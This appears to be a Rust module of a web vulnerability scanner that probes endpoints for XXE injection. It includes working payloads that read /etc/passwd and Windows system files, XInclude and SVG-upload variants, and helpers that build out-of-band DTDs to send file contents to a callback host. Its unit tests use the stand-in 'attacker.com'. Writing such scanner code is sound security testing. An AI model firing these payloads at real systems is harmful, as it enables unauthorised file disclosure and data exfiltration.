//! XXE (XML External Entity) Injection testing
//!
//! Tests for XML External Entity vulnerabilities including:
//! - Classic XXE (file disclosure)
//! - Blind XXE (out-of-band)
//! - XXE to SSRF
//! - Parameter entity injection
//! - DTD based XXE

#![allow(dead_code)]

use anyhow::Result;

use crate::http::{HttpClient, Request};
use crate::scanner::findings::{Finding, Severity};

/// XXE payloads for file disclosure
const FILE_XXE_PAYLOADS: &[(&str, &str, &str)] = &[
    // Linux file disclosure
    (
        r#"<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>"#,
        "root:",
        "/etc/passwd",
    ),
    (
        r#"<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hosts">]><root>&xxe;</root>"#,
        "localhost",
        "/etc/hosts",
    ),
    (
        r#"<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><root>&xxe;</root>"#,
        "",
        "/etc/hostname",
    ),
    // Windows file disclosure
    (
        r#"<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">]><root>&xxe;</root>"#,
        "[fonts]",
        "C:/Windows/win.ini",
    ),
    (
        r#"<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/Windows/System32/drivers/etc/hosts">]><root>&xxe;</root>"#,
        "localhost",
        "C:/Windows/System32/drivers/etc/hosts",
    ),
];

/// Parameter entity XXE payloads
const PARAM_ENTITY_PAYLOADS: &[(&str, &str)] = &[
    // Parameter entity with file disclosure
    (
        r#"<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]><root>test</root>"#,
        "root:",
    ),
    // Nested parameter entities
    (
        r#"<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % data SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; xxe SYSTEM 'file:///etc/passwd'>">%eval;%xxe;]><root>test</root>"#,
        "root:",
    ),
];

/// XInclude payloads (for when XML parsing is internal)
const XINCLUDE_PAYLOADS: &[(&str, &str)] = &[
    (
        r#"<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>"#,
        "root:",
    ),
    (
        r#"<root xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///etc/passwd" parse="text"/></root>"#,
        "root:",
    ),
];

/// SVG-based XXE payloads
const SVG_XXE_PAYLOADS: &[(&str, &str)] = &[
    (
        r#"<?xml version="1.0" standalone="yes"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>"#,
        "root:",
    ),
];

/// Content types that might accept XML
const XML_CONTENT_TYPES: &[&str] = &[
    "application/xml",
    "text/xml",
    "application/xhtml+xml",
    "application/soap+xml",
    "application/rss+xml",
    "application/atom+xml",
    "image/svg+xml",
];

/// Scan for XXE vulnerabilities
pub async fn scan(client: &HttpClient, target_url: &str) -> Result<Vec<Finding>> {
    let mut findings = Vec::new();

    // Test with various XXE payloads in POST body
    for (payload, indicator, file) in FILE_XXE_PAYLOADS {
        for content_type in XML_CONTENT_TYPES {
            let mut request = Request::new("POST", target_url);
            request.headers.insert("Content-Type".to_string(), content_type.to_string());
            request.body = Some(payload.to_string());

            let response = match client.execute(&request).await {
                Ok(r) => r,
                Err(_) => continue,
            };

            let body = response.body_text();

            // Check for file contents in response
            if !indicator.is_empty() && body.contains(indicator) {
                findings.push(
                    Finding::new("XXE Injection", Severity::Critical, target_url)
                        .with_description(&format!(
                            "XML External Entity (XXE) injection detected. File '{}' contents disclosed in response.",
                            file
                        ))
                        .with_evidence(&format!(
                            "Content-Type: {}\nIndicator found: '{}'\nPayload type: Classic XXE",
                            content_type, indicator
                        ))
                        .with_scanner("active/xxe")
                        .with_cwe(611)
                        .with_owasp("A05:2017 – Security Misconfiguration")
                        .with_remediation(
                            "Disable external entity processing in XML parser. Use less complex data formats like JSON where possible. Patch or upgrade all XML processors and libraries. Implement input validation."
                        )
                        .with_request(&format!("POST {} with XXE payload", target_url)),
                );

                return Ok(findings); // Found XXE, no need to continue
            }
        }
    }

    // Test parameter entity XXE
    for (payload, indicator) in PARAM_ENTITY_PAYLOADS {
        let mut request = Request::new("POST", target_url);
        request.headers.insert("Content-Type".to_string(), "application/xml".to_string());
        request.body = Some(payload.to_string());

        let response = match client.execute(&request).await {
            Ok(r) => r,
            Err(_) => continue,
        };

        let body = response.body_text();

        if body.contains(indicator) {
            findings.push(
                Finding::new("XXE via Parameter Entities", Severity::Critical, target_url)
                    .with_description(
                        "XXE injection via parameter entities detected. This allows file disclosure through DTD parameter expansion."
                    )
                    .with_evidence(&format!("Indicator found: '{}'", indicator))
                    .with_scanner("active/xxe-param")
                    .with_cwe(611)
                    .with_owasp("A05:2017 – Security Misconfiguration")
                    .with_remediation(
                        "Disable DTD processing entirely. If DTDs are required, disable external entity and parameter entity processing."
                    ),
            );

            return Ok(findings);
        }
    }

    // Test XInclude-based XXE
    for (payload, indicator) in XINCLUDE_PAYLOADS {
        let mut request = Request::new("POST", target_url);
        request.headers.insert("Content-Type".to_string(), "application/xml".to_string());
        request.body = Some(payload.to_string());

        let response = match client.execute(&request).await {
            Ok(r) => r,
            Err(_) => continue,
        };

        let body = response.body_text();

        if body.contains(indicator) {
            findings.push(
                Finding::new("XXE via XInclude", Severity::Critical, target_url)
                    .with_description(
                        "XXE injection via XInclude directive detected. XInclude allows including external resources."
                    )
                    .with_scanner("active/xxe-xinclude")
                    .with_cwe(611)
                    .with_remediation("Disable XInclude processing in XML parser."),
            );

            return Ok(findings);
        }
    }

    Ok(findings)
}

/// Test for XXE in file upload scenarios (SVG, DOCX, etc.)
pub async fn scan_file_upload(
    client: &HttpClient,
    target_url: &str,
    field_name: &str,
) -> Result<Vec<Finding>> {
    let mut findings = Vec::new();

    // Test SVG-based XXE
    for (payload, indicator) in SVG_XXE_PAYLOADS {
        let boundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW";
        let body = format!(
            "--{boundary}\r\nContent-Disposition: form-data; name=\"{field_name}\"; filename=\"test.svg\"\r\nContent-Type: image/svg+xml\r\n\r\n{payload}\r\n--{boundary}--\r\n",
            boundary = boundary,
            field_name = field_name,
            payload = payload
        );

        let mut request = Request::new("POST", target_url);
        request.headers.insert(
            "Content-Type".to_string(),
            format!("multipart/form-data; boundary={}", boundary),
        );
        request.body = Some(body);

        let response = match client.execute(&request).await {
            Ok(r) => r,
            Err(_) => continue,
        };

        let resp_body = response.body_text();

        if resp_body.contains(indicator) {
            findings.push(
                Finding::new("XXE via SVG Upload", Severity::High, target_url)
                    .with_description(
                        "XXE injection detected via SVG file upload. SVG files can contain XML and trigger XXE when parsed."
                    )
                    .with_parameter(field_name)
                    .with_scanner("active/xxe-svg")
                    .with_cwe(611)
                    .with_remediation(
                        "Sanitize uploaded SVG files or use a safe SVG parser. Consider converting to raster format if SVG features aren't needed."
                    ),
            );

            break;
        }
    }

    Ok(findings)
}

/// Detect if endpoint accepts XML (for reconnaissance)
pub async fn detect_xml_endpoint(client: &HttpClient, target_url: &str) -> Result<bool> {
    for content_type in XML_CONTENT_TYPES {
        let mut request = Request::new("POST", target_url);
        request.headers.insert("Content-Type".to_string(), content_type.to_string());
        request.body = Some("<test>probe</test>".to_string());

        if let Ok(response) = client.execute(&request).await {
            let status = response.status;
            // If we don't get a 415 Unsupported Media Type, XML might be accepted
            if status != 415 {
                return Ok(true);
            }
        }
    }

    Ok(false)
}

/// Generate blind XXE callback URL payload
pub fn generate_oob_payload(callback_url: &str, file_path: &str) -> String {
    format!(
        r#"<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "{}"><!ENTITY % dtd SYSTEM "{}">%dtd;]><root>test</root>"#,
        file_path, callback_url
    )
}

/// Generate DTD file content for OOB XXE exfiltration
pub fn generate_oob_dtd(callback_url: &str, file_path: &str) -> String {
    format!(
        r#"<!ENTITY % data SYSTEM "{}">
<!ENTITY % param1 "<!ENTITY exfil SYSTEM '{}?data=%data;'>">
%param1;"#,
        file_path, callback_url
    )
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_xml_content_types() {
        assert!(XML_CONTENT_TYPES.contains(&"application/xml"));
        assert!(XML_CONTENT_TYPES.contains(&"text/xml"));
        assert!(XML_CONTENT_TYPES.contains(&"image/svg+xml"));
    }

    #[test]
    fn test_file_xxe_payloads() {
        assert!(!FILE_XXE_PAYLOADS.is_empty());
        for (payload, _, _) in FILE_XXE_PAYLOADS {
            assert!(payload.contains("<!ENTITY"));
            assert!(payload.contains("SYSTEM"));
        }
    }

    #[test]
    fn test_generate_oob_payload() {
        let payload = generate_oob_payload("http://attacker.com/dtd.xml", "file:///etc/passwd");
        assert!(payload.contains("attacker.com"));
        assert!(payload.contains("file:///etc/passwd"));
    }

    #[test]
    fn test_generate_oob_dtd() {
        let dtd = generate_oob_dtd("http://attacker.com/collect", "file:///etc/passwd");
        assert!(dtd.contains("attacker.com"));
        assert!(dtd.contains("data="));
    }
}
